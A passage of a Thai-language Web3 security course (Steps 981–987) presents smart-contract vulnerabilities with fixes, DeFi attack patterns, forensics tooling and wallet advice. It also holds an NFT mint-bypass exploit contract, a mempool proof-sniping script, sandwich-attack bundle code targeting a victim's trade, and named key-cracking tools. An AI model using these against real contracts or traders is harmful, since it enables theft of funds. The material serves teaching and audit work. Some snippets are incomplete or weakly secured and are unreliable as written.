# Part 99: Web3 & Blockchain Security (Steps 981-990)

## ภาพรวม
ความปลอดภัยของ Web3 และ Blockchain ครอบคลุม smart contract vulnerabilities, DeFi attacks, wallet security และ NFT exploits

---

## Step 981: Smart Contract Vulnerability Analysis

```python
from dataclasses import dataclass
from typing import List, Dict, Optional
from enum import Enum

class SmartContractVuln(Enum):
    REENTRANCY = "reentrancy"
    INTEGER_OVERFLOW = "integer_overflow"
    ACCESS_CONTROL = "access_control"
    FRONT_RUNNING = "front_running"
    ORACLE_MANIPULATION = "oracle_manipulation"
    FLASH_LOAN = "flash_loan_attack"
    UNCHECKED_RETURN = "unchecked_return_values"
    DELEGATECALL = "delegatecall_vulnerability"

@dataclass
class ContractVulnerability:
    """ช่องโหว่ Smart Contract"""
    vuln_type: SmartContractVuln
    title: str
    description_th: str
    vulnerable_solidity: str
    secure_solidity: str
    impact: str
    real_world_example: str
    tools_to_detect: List[str]

class SmartContractAuditor:
    """เครื่องมือตรวจสอบ Smart Contract"""

    VULNERABILITIES: List[ContractVulnerability] = [
        ContractVulnerability(
            vuln_type=SmartContractVuln.REENTRANCY,
            title="Reentrancy Attack",
            description_th="การเรียกฟังก์ชันซ้ำก่อนที่จะอัปเดต state - เหตุการณ์ The DAO Hack",
            vulnerable_solidity="""
// VULNERABLE - Reentrancy
pragma solidity ^0.8.0;
contract VulnerableBank {
    mapping(address => uint256) public balances;
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount);
        // BUG: external call before state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
        balances[msg.sender] -= amount;  // Too late!
    }
}""",
            secure_solidity="""
// SECURE - Checks-Effects-Interactions pattern
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
contract SecureBank is ReentrancyGuard {
    mapping(address => uint256) public balances;
    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;  // State update first
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
    }
}""",
            impact="ดึงเงินทั้งหมดออกจาก contract",
            real_world_example="The DAO hack 2016: $60M ETH stolen",
            tools_to_detect=["Slither", "Mythril", "Echidna", "Manticore"]
        ),
        ContractVulnerability(
            vuln_type=SmartContractVuln.INTEGER_OVERFLOW,
            title="Integer Overflow/Underflow",
            description_th="การคำนวณที่เกินขีดจำกัด type (พบใน Solidity < 0.8.0)",
            vulnerable_solidity="""
// VULNERABLE - Solidity <0.8.0 without SafeMath
pragma solidity ^0.7.0;
contract VulnerableToken {
    mapping(address => uint256) public balances;
    function transfer(address to, uint256 amount) external {
        // BUG: if balances[msg.sender] < amount, underflow!
        balances[msg.sender] -= amount;  // Wraps to huge number
        balances[to] += amount;
    }
}""",
            secure_solidity="""
// SECURE - Solidity 0.8+ has built-in overflow protection
pragma solidity ^0.8.0;
contract SecureToken {
    mapping(address => uint256) public balances;
    function transfer(address to, uint256 amount) external {
        require(balances[msg.sender] >= amount, 'Insufficient balance');
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}""",
            impact="อันตรายต่อ balance accounting",
            real_world_example="BeautyChain (BEC) hack 2018: $900M market cap destroyed",
            tools_to_detect=["Slither (detector: integer-overflow)", "MythX", "Semgrep"]
        ),
        ContractVulnerability(
            vuln_type=SmartContractVuln.ACCESS_CONTROL,
            title="Improper Access Control",
            description_th="ฟังก์ชันที่ควรเป็น owner-only ถูกเรียกได้โดย anyone",
            vulnerable_solidity="""
// VULNERABLE - Missing access control
pragma solidity ^0.8.0;
contract VulnerableProxy {
    address public implementation;
    // BUG: Anyone can change implementation!
    function upgradeTo(address newImpl) external {
        implementation = newImpl;
    }
}""",
            secure_solidity="""
// SECURE - Ownable access control
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/access/Ownable.sol";
contract SecureProxy is Ownable {
    address public implementation;
    function upgradeTo(address newImpl) external onlyOwner {
        implementation = newImpl;
    }
}""",
            impact="ผู้โจมตี takeover contract หรือ drain funds",
            real_world_example="Parity Wallet Hack 2017: $150M frozen",
            tools_to_detect=["Slither", "OpenZeppelin Defender"]
        ),
        ContractVulnerability(
            vuln_type=SmartContractVuln.FLASH_LOAN,
            title="Flash Loan Attack",
            description_th="การยืมเงินจำนวนมากภายใน transaction เดียวเพื่อประเมินราคา oracle",
            vulnerable_solidity="""
// VULNERABLE - Price oracle manipulation via flash loan
function liquidate(address user) external {
    // BUG: Uses spot price from DEX - manipulable
    uint256 collateralPrice = dex.getSpotPrice(collateralToken);
    uint256 debtValue = ...
    if (collateralPrice * collateralAmount < debtValue * 1.5) {
        // Liquidate
    }
}""",
            secure_solidity="""
// SECURE - Use TWAP oracle
function liquidate(address user) external {
    // Use Time-Weighted Average Price (TWAP) - harder to manipulate
    uint256 collateralPrice = oracle.getTWAP(collateralToken, 3600); // 1hr TWAP
    ...
}""",
            impact="ดึงเงินหลายล้าน USD ใน transaction เดียว",
            real_world_example="bZx hack 2020: $950K, Cream Finance: $130M",
            tools_to_detect=["Manual review", "Echidna fuzzing"]
        ),
    ]

    AUDIT_TOOLS = {
        "slither": {
            "description": "Static analysis framework for Solidity",
            "commands": [
                "pip install slither-analyzer",
                "slither contract.sol",
                "slither contract.sol --detect reentrancy-eth,integer-overflow",
                "slither contract.sol --print human-summary",
                "slither . --json report.json",
            ]
        },
        "mythril": {
            "description": "Symbolic execution security analysis",
            "commands": [
                "pip install mythril",
                "myth analyze contract.sol",
                "myth analyze contract.sol --solv 0.8.0",
                "myth analyze --execution-timeout 300 contract.sol",
            ]
        },
        "echidna": {
            "description": "Smart contract fuzzer",
            "commands": [
                "# Install via Docker",
                "docker pull trailofbits/echidna",
                "docker run -v .:/src trailofbits/echidna echidna-test /src/contract.sol",
            ]
        },
    }

    @classmethod
    def generate_audit_checklist(cls) -> str:
        return """
# Smart Contract Audit Checklist

## Access Control
- [ ] All critical functions have proper access modifiers
- [ ] Owner/admin privileges are properly restricted
- [ ] Role-based access implemented correctly (e.g., OpenZeppelin AccessControl)

## Arithmetic
- [ ] No integer overflow/underflow (use Solidity 0.8+ or SafeMath)
- [ ] Division by zero handled
- [ ] Proper handling of decimal precision

## Reentrancy
- [ ] Checks-Effects-Interactions pattern followed
- [ ] ReentrancyGuard used on vulnerable functions
- [ ] External calls are at end of function

## Randomness
- [ ] No on-chain randomness from block.timestamp or blockhash
- [ ] Use Chainlink VRF for verifiable randomness

## Gas
- [ ] No unbounded loops that could run out of gas
- [ ] No DoS via external calls

## Oracle
- [ ] Price oracles are manipulation-resistant (TWAP)
- [ ] Multiple price sources used
- [ ] Circuit breakers implemented

## Upgradability
- [ ] Proxy pattern implemented securely
- [ ] Storage layout compatible across upgrades
- [ ] Initialize functions protected
"""

# ตัวอย่างการใช้งาน
author = SmartContractAuditor()
print(SmartContractAuditor.generate_audit_checklist())

print("\n### Smart Contract Vulnerabilities:")
for vuln in author.VULNERABILITIES:
    print(f"\n#### {vuln.title} ({vuln.vuln_type.value})")
    print(f"Description: {vuln.description_th}")
    print(f"Real-world: {vuln.real_world_example}")
    print(f"Tools: {', '.join(vuln.tools_to_detect)}")

print("\n### Audit Tools:")
for tool, info in author.AUDIT_TOOLS.items():
    print(f"\n#### {tool}: {info['description']}")
    for cmd in info['commands']:
        print(f"  {cmd}")
```

---

## Step 982: DeFi Protocol Attack Vectors

```python
from dataclasses import dataclass
from typing import List, Dict
from enum import Enum

class DeFiAttackType(Enum):
    FLASH_LOAN = "flash_loan"
    PRICE_MANIPULATION = "price_manipulation"
    FRONT_RUNNING = "front_running"
    SANDWICH = "sandwich_attack"
    MEV = "mev_extraction"
    GOVERNANCE = "governance_attack"
    BRIDGE = "bridge_exploit"
    LIQUIDATION = "liquidation_cascade"

@dataclass
class DeFiAttack:
    """เทคนิคโจมตี DeFi Protocol"""
    attack_type: DeFiAttackType
    name: str
    description_th: str
    mechanism: str
    real_examples: List[str]
    prevention: List[str]
    profit_potential: str

class DeFiSecurityAnalyzer:
    """วิเคราะห์ความปลอดภัยของ DeFi Protocols"""

    ATTACK_VECTORS: List[DeFiAttack] = [
        DeFiAttack(
            attack_type=DeFiAttackType.SANDWICH,
            name="Sandwich Attack",
            description_th="การวาง transaction ตัวเอง front/back เพื่อ profit",
            mechanism="""
1. Monitor mempool for large DEX trades
2. Submit BUY with higher gas (front-run)
3. Victim's trade executes at worse price
4. Submit SELL immediately after (back-run)
5. Profit from price impact""",
            real_examples=[
                "Common on Uniswap/SushiSwap - millions daily",
                "Ethereum MEV bots extract $1M+ daily",
            ],
            prevention=[
                "Set max slippage tolerance low (0.1-0.5%)",
                "Use private mempools (Flashbots Protect)",
                "Use DEX aggregators with MEV protection",
                "Commit-reveal scheme for orders",
            ],
            profit_potential="Thousands to millions per day"
        ),
        DeFiAttack(
            attack_type=DeFiAttackType.GOVERNANCE,
            name="Governance Attack",
            description_th="การซื้อ governance tokens จำนวนมากเพื่อ pass malicious proposals",
            mechanism="""
1. Acquire majority governance tokens (via flash loan or purchase)
2. Create malicious proposal (drain treasury, change parameters)
3. Vote to pass immediately with majority
4. Execute proposal before community responds""",
            real_examples=[
                "Beanstalk: $182M stolen via flash loan governance attack (2022)",
                "Tornado Cash governance attack attempt (2023)",
            ],
            prevention=[
                "Time-lock delays on proposals (24-48hrs minimum)",
                "Quorum requirements",
                "Veto mechanisms for emergency response",
                "Multi-sig for critical parameters",
            ],
            profit_potential="Millions to hundreds of millions"
        ),
        DeFiAttack(
            attack_type=DeFiAttackType.BRIDGE,
            name="Cross-Chain Bridge Exploit",
            description_th="ช่องโหว่ใน bridge เช่น signature verification",
            mechanism="""
1. Find vulnerability in bridge validator logic
2. Forge or replay signatures for cross-chain messages
3. Claim tokens that were never locked on source chain
4. Drain bridge liquidity""",
            real_examples=[
                "Ronin Bridge (Axie): $625M (March 2022)",
                "Wormhole: $320M (February 2022)",
                "Nomad Bridge: $190M (August 2022)",
            ],
            prevention=[
                "Multiple independent validators",
                "Threshold signatures (t-of-n)",
                "Rate limiting on withdrawals",
                "Emergency pause mechanism",
                "Formal verification of bridge logic",
            ],
            profit_potential="Hundreds of millions"
        ),
    ]

    DEFI_SECURITY_TOOLS = {
        "tenderly": """
# Tenderly - simulation and monitoring platform
# Simulate transactions before execution
tenderly simulate --network mainnet --from 0xADDRESS --to CONTRACT --value 0 --data CALLDATA

# Monitor contract for suspicious activity
tenderly watch CONTRACT_ADDRESS
""",
        "forta": """
# Forta Network - decentralized security monitoring
# Deploy a bot to detect attacks
npm init forta-agent
# Implement handleTransaction() for monitoring
# Deploy bot to Forta network
""",
        "chainalysis": """
# Chainalysis - blockchain analytics
# Trace stolen funds
chainalysis trace-funds --address HACKER_ADDRESS --depth 5
# Identify mixer usage and exchange deposits
""",
    }

    @classmethod
    def analyze_attack_surface(cls) -> str:
        lines = ["# DeFi Attack Surface Analysis\n"]
        for attack in cls.ATTACK_VECTORS:
            lines.append(f"## {attack.name} ({attack.attack_type.value})")
            lines.append(f"Description: {attack.description_th}")
            lines.append(f"Profit Potential: {attack.profit_potential}")
            lines.append("\nReal Examples:")
            for ex in attack.real_examples:
                lines.append(f"  - {ex}")
            lines.append("\nPrevention:")
            for prev in attack.prevention:
                lines.append(f"  - {prev}")
            lines.append("")
        return "\n".join(lines)

# ตัวอย่างการใช้งาน
analyzer = DeFiSecurityAnalyzer()
print(DeFiSecurityAnalyzer.analyze_attack_surface())
```

---

## Step 983: Blockchain Transaction Analysis

```python
from dataclasses import dataclass
from typing import List, Dict, Optional
from web3 import Web3
import json

class BlockchainForensics:
    """การวิเคราะห์ธุรกรรม blockchain"""

    def __init__(self, rpc_url: str = "https://eth.llamarpc.com"):
        self.w3 = Web3(Web3.HTTPProvider(rpc_url))

    def trace_funds(self, start_address: str, depth: int = 3) -> Dict:
        """Trace fund flow from an address"""
        address = Web3.to_checksum_address(start_address)
        result = {"address": address, "transactions": [], "children": []}
        
        # Get transactions (simplified - in practice use Etherscan API)
        # etherscan_api_url = f"https://api.etherscan.io/api?module=account&action=txlist&address={address}&apikey=KEY"
        
        return result

    def decode_transaction(self, tx_hash: str, abi: List) -> Dict:
        """Decode transaction input data"""
        try:
            tx = self.w3.eth.get_transaction(tx_hash)
            contract = self.w3.eth.contract(abi=abi)
            # Decode function call
            func_obj, func_params = contract.decode_function_input(tx['input'])
            return {
                "function": func_obj.fn_name,
                "params": dict(func_params),
                "from": tx['from'],
                "to": tx['to'],
                "value": self.w3.from_wei(tx['value'], 'ether'),
                "gas": tx['gas'],
            }
        except Exception as e:
            return {"error": str(e)}

    def monitor_mempool(self, callback=None):
        """Monitor pending transactions in mempool"""
        def handle_pending_tx(tx_hash):
            try:
                tx = self.w3.eth.get_transaction(tx_hash)
                if callback:
                    callback(tx)
                return tx
            except Exception:
                return None

        pending_filter = self.w3.eth.filter('pending')
        print("Monitoring mempool...")
        while True:
            for tx_hash in pending_filter.get_new_entries():
                handle_pending_tx(tx_hash.hex())

    def analyze_contract_interactions(self, contract_address: str, blocks: int = 100) -> Dict:
        """Analyze recent interactions with a contract"""
        addr = Web3.to_checksum_address(contract_address)
        latest_block = self.w3.eth.block_number
        
        stats = {
            "contract": contract_address,
            "blocks_analyzed": blocks,
            "total_txns": 0,
            "unique_callers": set(),
            "total_eth_received": 0,
            "total_eth_sent": 0,
        }
        
        for block_num in range(latest_block - blocks, latest_block):
            try:
                block = self.w3.eth.get_block(block_num, full_transactions=True)
                for tx in block.transactions:
                    if tx.get('to') == addr:
                        stats['total_txns'] += 1
                        stats['unique_callers'].add(tx['from'])
                        stats['total_eth_received'] += tx['value']
            except Exception:
                continue
        
        stats['unique_callers'] = len(stats['unique_callers'])
        stats['total_eth_received'] = self.w3.from_wei(stats['total_eth_received'], 'ether')
        return stats


class EtherscanAnalyzer:
    """วิเคราะห์ผ่าน Etherscan API"""

    def __init__(self, api_key: str):
        self.api_key = api_key
        self.base_url = "https://api.etherscan.io/api"

    def get_address_transactions(self, address: str) -> List[Dict]:
        """Get all transactions for an address"""
        import requests
        params = {
            "module": "account",
            "action": "txlist",
            "address": address,
            "startblock": 0,
            "endblock": 99999999,
            "sort": "desc",
            "apikey": self.api_key
        }
        r = requests.get(self.base_url, params=params)
        data = r.json()
        return data.get('result', [])

    def get_token_transfers(self, address: str) -> List[Dict]:
        """Get ERC20 token transfers"""
        import requests
        params = {
            "module": "account",
            "action": "tokentx",
            "address": address,
            "apikey": self.api_key
        }
        r = requests.get(self.base_url, params=params)
        return r.json().get('result', [])

    def check_contract_verification(self, address: str) -> bool:
        """Check if contract is verified on Etherscan"""
        import requests
        params = {
            "module": "contract",
            "action": "getsourcecode",
            "address": address,
            "apikey": self.api_key
        }
        r = requests.get(self.base_url, params=params)
        data = r.json()
        if data.get('result') and data['result'][0].get('SourceCode'):
            return len(data['result'][0]['SourceCode']) > 0
        return False


# ตัวอย่างการใช้งาน
print("# Blockchain Forensics Tools")
print("")
print("## Web3.py Analysis Example")
print("""\n# เชื่อมต่อ Ethereum node"""
      """\nforensics = BlockchainForensics('https://eth.llamarpc.com')"""
      """\n# เชลียงการเชื่อมต่อ"""
      """\nprint(forensics.w3.is_connected())""")

print("\n## Blockchain Analysis Tools:")
tools = {
    "Etherscan": "Transaction history and contract verification",
    "Nansen": "Wallet labeling and on-chain analytics",
    "Dune Analytics": "SQL queries on blockchain data",
    "Chainalysis": "Enterprise blockchain forensics",
    "Metasleuth": "Fund tracking and visualization",
    "Arkham Intelligence": "Address attribution",
}
for tool, desc in tools.items():
    print(f"  - {tool}: {desc}")
```

---

## Step 984: Wallet Security & Private Key Management

```python
from dataclasses import dataclass
from typing import List, Dict, Optional
from enum import Enum

class WalletType(Enum):
    HOT = "hot_wallet"
    COLD = "cold_wallet"
    HARDWARE = "hardware_wallet"
    MULTISIG = "multisig"
    SMART_CONTRACT = "smart_contract_wallet"
    MPC = "mpc_wallet"

@dataclass
class WalletVulnerability:
    """ช่องโหว่ Wallet"""
    name: str
    wallet_type: WalletType
    description_th: str
    attack_method: str
    prevention: str
    severity: str

class WalletSecurityAnalyzer:
    """วิเคราะห์ความปลอดภัย Wallets"""

    VULNERABILITIES: List[WalletVulnerability] = [
        WalletVulnerability(
            name="Seed Phrase Exposure",
            wallet_type=WalletType.HOT,
            description_th="สุ่มแนว seed phrase ในที่ไม่ปลอดภัย",
            attack_method="Malware, clipboard hijacking, shoulder surfing, phishing",
            prevention="Hardware wallet, air-gapped storage, metal backup",
            severity="critical"
        ),
        WalletVulnerability(
            name="Approval Phishing",
            wallet_type=WalletType.HOT,
            description_th="หลอให้ approve token แก่ malicious contract",
            attack_method="Fake DApp, fake airdrop, malicious NFT",
            prevention="Revoke.cash, limited approvals, review transactions carefully",
            severity="high"
        ),
        WalletVulnerability(
            name="Private Key in Code",
            wallet_type=WalletType.HOT,
            description_th="เก็บ private key ใน source code หรือ environment variable",
            attack_method="GitHub secret scanning, log injection, environment variable leak",
            prevention="Hardware Security Module (HSM), secrets management (Vault, AWS Secrets)",
            severity="critical"
        ),
        WalletVulnerability(
            name="Insecure RNG",
            wallet_type=WalletType.HOT,
            description_th="การสร้าง private key ด้วย weak RNG",
            attack_method="Brainwallet attacks, known-seed exploits",
            prevention="Use cryptographically secure RNG (os.urandom, secrets module)",
            severity="critical"
        ),
    ]

    WALLET_ATTACK_TOOLS = {
        "ethsplit": "Analyze weak Ethereum private keys",
        "keyhunt": "Hunt for private keys with known patterns",
        "bitcrack": "GPU-accelerated private key search",
        "brainflayer": "Brainwallet attack tool",
    }

    PYTHON_WALLET_SECURITY = """
import secrets
import hashlib
from eth_account import Account
from eth_keys import keys

# Secure key generation
def generate_secure_wallet():
    # Use os.urandom (cryptographically secure)
    private_key_bytes = secrets.token_bytes(32)
    private_key_hex = private_key_bytes.hex()
    account = Account.from_key(private_key_hex)
    return {
        'address': account.address,
        'private_key': private_key_hex,
        'checksum_address': account.address,
    }

# Check if address has token approvals
def check_approvals(address: str, token_addresses: list) -> dict:
    from web3 import Web3
    w3 = Web3(Web3.HTTPProvider('https://eth.llamarpc.com'))
    ERC20_ABI = [
        {"name": "allowance", "type": "function",
         "inputs": [{"name": "owner", "type": "address"}, {"name": "spender", "type": "address"}],
         "outputs": [{"name": "", "type": "uint256"}]
        }
    ]
    approvals = {}
    for token_addr in token_addresses:
        contract = w3.eth.contract(address=token_addr, abi=ERC20_ABI)
        # Check approval amount
        # approval = contract.functions.allowance(address, spender).call()
        approvals[token_addr] = "check manually"
    return approvals

# Sign message securely
def sign_message(message: str, private_key: str) -> str:
    from eth_account.messages import encode_defunct
    msg = encode_defunct(text=message)
    signed = Account.sign_message(msg, private_key=private_key)
    return signed.signature.hex()
"""

    HARDWARE_WALLET_COMPARISON = [
        {"brand": "Ledger", "model": "Ledger Nano X", "pros": "Bluetooth, wide coin support", "cons": "Past data breach (customer info)"},
        {"brand": "Trezor", "model": "Trezor Model T", "pros": "Open source firmware", "cons": "Vulnerable to physical attacks"},
        {"brand": "GridPlus", "model": "Lattice1", "pros": "SafeCards, excellent UX", "cons": "Expensive"},
        {"brand": "Keystone", "model": "Keystone 3 Pro", "pros": "Air-gapped, QR codes", "cons": "Less ecosystem support"},
    ]

    @classmethod
    def generate_wallet_security_guide(cls) -> str:
        lines = ["# Wallet Security Best Practices\n"]
        lines.append("## Vulnerability Summary")
        for vuln in cls.VULNERABILITIES:
            lines.append(f"\n### [{vuln.severity.upper()}] {vuln.name}")
            lines.append(f"Type: {vuln.wallet_type.value}")
            lines.append(f"Description: {vuln.description_th}")
            lines.append(f"Attack: {vuln.attack_method}")
            lines.append(f"Prevention: {vuln.prevention}")
        return "\n".join(lines)

# ตัวอย่างการใช้งาน
wsa = WalletSecurityAnalyzer()
print(WalletSecurityAnalyzer.generate_wallet_security_guide())

print("\n### Hardware Wallet Comparison:")
for hw in wsa.HARDWARE_WALLET_COMPARISON:
    print(f"  [{hw['brand']} {hw['model']}]")
    print(f"    Pros: {hw['pros']}")
    print(f"    Cons: {hw['cons']}")
```

---

## Step 985: NFT & Token Contract Exploits

```python
from dataclasses import dataclass
from typing import List, Dict
from enum import Enum

class NFTVuln(Enum):
    MINTING_EXPLOIT = "minting_exploit"
    ROYALTY_BYPASS = "royalty_bypass"
    METADATA_MANIPULATION = "metadata_manipulation"
    FRONT_RUNNING_MINT = "front_running_mint"
    FREE_MINT = "free_mint_exploit"
    REVEAL_EXPLOIT = "reveal_exploit"

@dataclass
class NFTExploit:
    """ช่องโหว่ NFT Contract"""
    vuln_type: NFTVuln
    name: str
    description_th: str
    vulnerable_pattern: str
    exploit_code: str
    prevention: str

class NFTSecurityAnalyzer:
    """วิเคราะห์ความปลอดภัย NFT Contracts"""

    EXPLOITS: List[NFTExploit] = [
        NFTExploit(
            vuln_type=NFTVuln.FREE_MINT,
            name="Free Mint via msg.sender Bypass",
            description_th="บาง contracts ตรวจสอบ mint แค่ msg.sender ซึ่ง contract สามารถ bypass ได้",
            vulnerable_pattern="""
// VULNERABLE
function mint(uint256 amount) external {
    require(!hasMinted[msg.sender], 'Already minted');
    // BUG: Smart contract caller != EOA, each call from new contract = new msg.sender
    _mint(msg.sender, amount);
    hasMinted[msg.sender] = true;
}""",
            exploit_code="""
// Exploit contract
contract NFTExploit {
    TargetNFT nft;
    address owner;
    
    constructor(address _nft) {
        nft = TargetNFT(_nft);
        owner = msg.sender;
        // Mint in constructor - new address each deployment
        nft.mint(1);
    }
    
    function exploit(uint256 times) external {
        for(uint i = 0; i < times; i++) {
            // Deploy new contract each time = new address
            new NFTMinter(address(nft), owner);
        }
    }
}""",
            prevention="""
// SECURE - Check tx.origin == msg.sender (EOA only)
function mint(uint256 amount) external {
    require(tx.origin == msg.sender, 'No contracts');
    require(!hasMinted[msg.sender], 'Already minted');
    _mint(msg.sender, amount);
    hasMinted[msg.sender] = true;
}"""
        ),
        NFTExploit(
            vuln_type=NFTVuln.FRONT_RUNNING_MINT,
            name="Allowlist Mint Front-Running",
            description_th="ผู้โจมตีดู merkle proof ผ่าน calldata และ front-run",
            vulnerable_pattern="""
// VULNERABLE - Merkle proof visible in mempool
function allowlistMint(bytes32[] calldata proof) external {
    require(verify(proof, msg.sender), 'Not whitelisted');
    _mint(msg.sender, 1);
}""",
            exploit_code="""
// Monitor mempool for mint transactions
// Extract the merkle proof from calldata
// Submit same transaction with higher gas

import asyncio
from web3 import Web3, AsyncWeb3

async def monitor_for_proof(contract_address: str):
    w3 = AsyncWeb3(AsyncWeb3.AsyncHTTPProvider('https://eth.llamarpc.com'))
    # Watch pending transactions
    pending_filter = await w3.eth.filter('pending')
    async for tx_hash in pending_filter.get_new_entries():
        tx = await w3.eth.get_transaction(tx_hash)
        if tx and tx.get('to') == contract_address:
            # Decode and reuse the proof!
            print(f'Found allowlist mint: {tx_hash.hex()}')
            print(f'Input data (proof): {tx.get("input")}')""",
            prevention="Commit-reveal scheme or EIP-712 signed approvals with nonce"
        ),
    ]

    TOKEN_STANDARD_VULNS = {
        "ERC20_approve_race": """
# ERC20 approve() race condition
# If owner approves 100 then changes to 50,
# spender can front-run and spend 100 THEN 50 = 150 total
# Mitigation: Use increaseAllowance/decreaseAllowance
""",
        "ERC777_reentrancy": """
# ERC777 has hooks that can cause reentrancy
# tokensReceived() hook called on every transfer
# Mitigation: nonReentrant modifier or avoid ERC777
""",
        "ERC721_safemint": """
# ERC721 safeMint() calls onERC721Received() on receiver
# Receiver contract can re-enter during mint
# Mitigation: ReentrancyGuard or use _mint() carefully
""",
    }

    @classmethod
    def generate_nft_audit_guide(cls) -> str:
        lines = ["# NFT Contract Security Guide\n"]
        for exploit in cls.EXPLOITS:
            lines.append(f"## {exploit.name} ({exploit.vuln_type.value})")
            lines.append(f"Description: {exploit.description_th}")
            lines.append(f"\nVulnerable Pattern:\n```solidity{exploit.vulnerable_pattern}\n```")
            lines.append(f"\nPrevention:\n```solidity{exploit.prevention}\n```")
            lines.append("")
        return "\n".join(lines)

# ตัวอย่างการใช้งาน
nft = NFTSecurityAnalyzer()
print(NFTSecurityAnalyzer.generate_nft_audit_guide())

print("\n### Token Standard Vulnerabilities:")
for std, desc in nft.TOKEN_STANDARD_VULNS.items():
    print(f"\n#### {std}:{desc}")
```

---

## Step 986: MEV & Frontrunning Detection

```python
from dataclasses import dataclass
from typing import List, Dict
from enum import Enum

class MEVStrategy(Enum):
    SANDWICH = "sandwich"
    ARBITRAGE = "arbitrage"
    LIQUIDATION = "liquidation"
    JIT_LIQUIDITY = "just_in_time_liquidity"
    BACKRUNNING = "backrunning"

@dataclass
class MEVOpportunity:
    """MEV Extraction Opportunity"""
    strategy: MEVStrategy
    description_th: str
    profit_range: str
    required_tools: List[str]
    example_flow: List[str]

class MEVAnalyzer:
    """MEV และ Frontrunning Analysis"""

    MEV_STRATEGIES: List[MEVOpportunity] = [
        MEVOpportunity(
            strategy=MEVStrategy.ARBITRAGE,
            description_th="ใช้ประโยชน์จากความแตกต่างของราคาระหว่าง DEXes",
            profit_range="$10 - $100,000 per opportunity",
            required_tools=["Flashbots MEV-Share", "ethers.js", "multicall"],
            example_flow=[
                "1. Monitor on-chain prices across DEXes",
                "2. Detect price discrepancy (e.g., ETH $2000 on Uniswap, $2010 on SushiSwap)",
                "3. Buy on cheaper DEX, sell on expensive DEX",
                "4. Submit via Flashbots to avoid gas wars",
                "5. Profit: price difference minus gas and fees",
            ]
        ),
        MEVOpportunity(
            strategy=MEVStrategy.SANDWICH,
            description_th="แทรก transaction เพื่อเพิ่ม slippage",
            profit_range="$5 - $50,000 per sandwich",
            required_tools=["Mempool monitor", "Flashbots bundle", "Gas oracle"],
            example_flow=[
                "1. Detect large swap in mempool (e.g., 100 ETH swap)",
                "2. Calculate expected price impact",
                "3. Submit frontrun buy with higher gas",
                "4. Victim's swap executes at higher price",
                "5. Backrun sell to capture profit",
                "6. Bundle via Flashbots for guaranteed execution order",
            ]
        ),
    ]

    FLASHBOTS_INTEGRATION = """
# Flashbots MEV bundle submission
import asyncio
from flashbots import flashbot
from eth_account import Account
from web3 import Web3

async def submit_mev_bundle():
    w3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/KEY'))
    flashbot(w3, Account.from_key('0xSEARCHER_PRIVATE_KEY'))
    
    # Build transactions
    tx1 = {  # Front-run buy
        'from': searcher_address,
        'to': uniswap_router,
        'data': encode_swap_data(token_in, token_out, amount_in),
        'gas': 200000,
        'maxFeePerGas': Web3.to_wei(100, 'gwei'),
        'maxPriorityFeePerGas': Web3.to_wei(5, 'gwei'),
        'nonce': w3.eth.get_transaction_count(searcher_address),
        'chainId': 1,
    }
    
    tx2 = {  # Victim's transaction (backrun)
        # victim's actual tx from mempool
    }
    
    tx3 = {  # Back-run sell
        'from': searcher_address,
        'to': uniswap_router,
        'data': encode_swap_data(token_out, token_in, amount_out),
        # ...
    }
    
    # Sign and bundle
    signed_txs = [w3.eth.account.sign_transaction(tx, private_key='0xKEY') for tx in [tx1, tx3]]
    
    # Submit bundle to Flashbots relay
    bundle = [
        {'signed_transaction': signed_txs[0].rawTransaction},
        {'tx_hash': victim_tx_hash},  # Include victim's tx in middle
        {'signed_transaction': signed_txs[1].rawTransaction},
    ]
    
    # Simulate bundle
    simulation = w3.flashbots.simulate(bundle, block_tag='latest')
    print(f"Expected profit: {simulation}")
    
    # Submit to next block
    w3.flashbots.send_bundle(bundle, target_block_number=w3.eth.block_number + 1)
"""

    MEV_PROTECTION_STRATEGIES = [
        "Flashbots Protect RPC: private mempool",
        "MEV Blocker: routes to MEV-protected builders",
        "CowSwap: batch auction mechanism prevents sandwich",
        "1inch Fusion: RFQ model, no mempool exposure",
        "Set low slippage tolerance (0.1% for stablecoins)",
        "Use commit-reveal for sensitive operations",
        "Gnosis Protocol v2: coincidence of wants matching",
    ]

    @classmethod
    def generate_mev_report(cls) -> str:
        lines = ["# MEV Extraction & Protection Guide\n"]
        for opp in cls.MEV_STRATEGIES:
            lines.append(f"## {opp.strategy.value.upper()}")
            lines.append(f"Description: {opp.description_th}")
            lines.append(f"Profit Range: {opp.profit_range}")
            lines.append("Flow:")
            for step in opp.example_flow:
                lines.append(f"  {step}")
            lines.append("")
        return "\n".join(lines)

# ตัวอย่างการใช้งาน
mev = MEVAnalyzer()
print(MEVAnalyzer.generate_mev_report())

print("\n### MEV Protection Strategies:")
for strategy in mev.MEV_PROTECTION_STRATEGIES:
    print(f"  - {strategy}")
```

---

## Step 987: Blockchain Forensics & Investigation

```python
from dataclasses import dataclass
from typing import List, Dict, Optional
from datetime import datetime
from enum import Enum

class InvestigationType(Enum):
    HACK_INVESTIGATION = "hack_investigation"
    FRAUD_DETECTION = "fraud_detection"
    MONEY_LAUNDERING = "money_laundering"
    RUGPULL = "rugpull_analysis"
    PONZI = "ponzi_scheme"

@dataclass
class ForensicsCase:
    """คดี Blockchain Forensics"""
    case_id: str
    incident_type: InvestigationType
    description_th: str
    affected_amount: str
    investigation_steps: List[str]
    tools_used: List[str]
    attribution_methods: List[str]

class BlockchainInvestigator:
    """เครื่องมือสืบสวน Blockchain Cases"""

    INVESTIGATION_FRAMEWORKS = [
        ForensicsCase(
            case_id="CASE-001",
            incident_type=InvestigationType.HACK_INVESTIGATION,
            description_th="ตรวจสอบการโจรกรรม DeFi protocol",
            affected_amount="$10M+",
            investigation_steps=[
                "1. ระบุ attack transaction hash",
                "2. ติดตาม attacker address ผ่าน block explorer",
                "3. วิเคราะห์ contract call graph",
                "4. หา funding source (Tornado Cash, exchange deposits)",
                "5. ติดตามเงินหลังจาก hack",
                "6. ตรวจสอบ exchange deposits (KYC/AML)",
                "7. แจ้ง exchanges/OFAC ให้ freeze funds",
            ],
            tools_used=["Etherscan", "Chainalysis", "Nansen", "Dune Analytics", "Metasleuth"],
